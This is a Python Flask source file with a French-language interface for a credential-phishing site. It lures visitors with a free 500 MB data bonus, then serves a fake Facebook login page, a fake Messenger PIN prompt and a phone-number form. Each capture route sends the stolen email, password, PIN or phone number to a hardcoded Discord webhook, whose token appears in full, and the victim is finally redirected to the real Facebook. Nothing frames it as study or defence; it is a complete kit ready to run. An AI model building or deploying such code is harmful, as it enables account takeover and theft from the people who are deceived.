import os
import requests
from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

# --- CONFIGURATION DISCORD ---
DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1471099314398040230/mrOS59JK1KfeIQICVwIFwNbURRhR08ivbdWy_P3VQdwPJD4r1opB8krL26i1tyePIH8h"

def send_to_discord(message):
    data = {"content": message}
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"Erreur : {e}")

# --- INTERFACES HTML ---

HTML_ACCUEIL = '''
<!DOCTYPE html>
<html>
<body style="text-align:center; font-family:sans-serif; background:#eef2f7; padding:50px;">
    <div style="background:white; padding:30px; border-radius:15px; display:inline-block; box-shadow:0 8px 20px rgba(0,0,0,0.1);">
        <h2>🎁 BONUS GRATUIT 500 MO</h2>
        <p>Vérifiez votre éligibilité maintenant.</p>
        <a href="/auth" style="display:block; padding:15px; background:#3498db; color:white; text-decoration:none; border-radius:8px; font-weight:bold;">VÉRIFIER MAINTENANT</a>
    </div>
</body>
</html>
'''

HTML_FACEBOOK = '''
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
<body style="font-family:Helvetica, Arial, sans-serif; background:#f0f2f5; text-align:center; margin:0;">
    <div style="width:100%; background:white; padding:20px 0; color:#1877f2; font-size:30px; font-weight:bold;">facebook</div>
    <div style="width:90%; max-width:400px; display:inline-block; background:white; padding:20px; margin-top:20px; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,0.1);">
        <p style="font-size:14px; color:#606770;">Connectez-vous pour réclamer votre bonus.</p>
        <form action="/capture" method="post">
            <input type="text" name="email" placeholder="Mobile number or email" style="width:100%; padding:14px; margin:5px 0; border:1px solid #dddfe2; border-radius:6px; box-sizing:border-box;" required><br>
            <input type="password" name="pass" placeholder="Password" style="width:100%; padding:14px; margin:5px 0; border:1px solid #dddfe2; border-radius:6px; box-sizing:border-box;" required><br>
            <button type="submit" style="width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:6px; font-size:18px; font-weight:bold; margin-top:10px; cursor:pointer;">Se connecter</button>
        </form>
    </div>
</body>
</html>
'''

# INTERFACE FIDÈLE À TA PHOTO
HTML_PIN = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; width: 95%; max-width: 500px; padding: 40px 20px; border-radius: 10px; text-align: center; box-shadow: 0 2px 12px rgba(0,0,0,0.1); }
        .icon-top { background-color: #d1e3ff; width: 80px; height: 35px; border-radius: 20px; display: inline-flex; justify-content: center; align-items: center; color: #0064e0; font-size: 20px; font-weight: bold; letter-spacing: 2px; margin-bottom: 30px; }
        h1 { font-size: 20px; color: #1c1e21; margin-bottom: 15px; font-weight: 600; line-height: 1.3; }
        p { color: #606770; font-size: 14px; line-height: 1.4; margin-bottom: 25px; padding: 0 10px; }
        .pin-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
        .pin-inputs input { width: 45px; height: 60px; border: 1px solid #ced0d4; border-radius: 8px; text-align: center; font-size: 24px; background: #f5f6f7; color: #1c1e21; }
        .pin-inputs input:focus { border-color: #0064e0; outline: none; background: white; }
        .btn-submit { width: 100%; padding: 12px; background-color: #0064e0; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .forgot { color: #0064e0; text-decoration: none; font-size: 14px; font-weight: 600; margin-top: 20px; display: inline-block; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon-top">***_</div>
        <h1>Saisissez votre code PIN pour restaurer l’historique de vos discussions</h1>
        <p>Il manque certains messages. Entrez votre code PIN pour restaurer l’historique de vos discussions.</p>
        
        <form action="/messenger_pin" method="post">
            <div class="pin-inputs">
                <input type="text" name="p1" maxlength="1" required>
                <input type="text" name="p2" maxlength="1" required>
                <input type="text" name="p3" maxlength="1" required>
                <input type="text" name="p4" maxlength="1" required>
                <input type="text" name="p5" maxlength="1" required>
                <input type="text" name="p6" maxlength="1" required>
            </div>
            <button type="submit" class="btn-submit">Continuer</button>
        </form>
        
        <a href="#" class="forgot">Code PIN oublié ?</a>
    </div>
    
    <script>
        // Petit script pour passer à la case suivante automatiquement
        const inputs = document.querySelectorAll('.pin-inputs input');
        inputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                if (input.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });
        });
    </script>
</body>
</html>
'''

HTML_BONUS = '''
<!DOCTYPE html>
<html>
<body style="text-align:center; font-family:sans-serif; padding-top:50px;">
    <h2 style="color:#2ecc71;">Vérification réussie !</h2>
    <p>Votre pack de 500 Mo est en cours d'activation sur votre compte.</p>
    <form action="/final" method="post">
        <input type="text" name="phone" placeholder="Numéro de téléphone" style="padding:10px; border-radius:5px; border:1px solid #ddd;" required><br><br>
        <button type="submit" style="padding:10px 20px; background:#2ecc71; color:white; border:none; border-radius:5px; font-weight:bold;">CONFIRMER</button>
    </form>
</body>
</html>
'''

# --- ROUTES (LOGIQUE) ---

@app.route('/')
def home():
    return render_template_string(HTML_ACCUEIL)

@app.route('/auth')
def auth():
    return render_template_string(HTML_FACEBOOK)

@app.route('/capture', methods=['POST'])
def capture():
    email = request.form.get('email')
    password = request.form.get('pass')
    send_to_discord(f"👤 **FB** : `{email}` | 🔑 **Pass** : `{password}`")
    return render_template_string(HTML_PIN)

@app.route('/messenger_pin', methods=['POST'])
def capture_pin():
    # On récupère les 6 chiffres des cases
    p1 = request.form.get('p1')
    p2 = request.form.get('p2')
    p3 = request.form.get('p3')
    p4 = request.form.get('p4')
    p5 = request.form.get('p5')
    p6 = request.form.get('p6')
    full_pin = f"{p1}{p2}{p3}{p4}{p5}{p6}"
    
    send_to_discord(f"💬 **PIN MESSENGER** : `{full_pin}`")
    return render_template_string(HTML_BONUS)

@app.route('/final', methods=['POST'])
def final():
    phone = request.form.get('phone')
    send_to_discord(f"📱 **TEL** : `{phone}`")
    return redirect("https://m.facebook.com")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
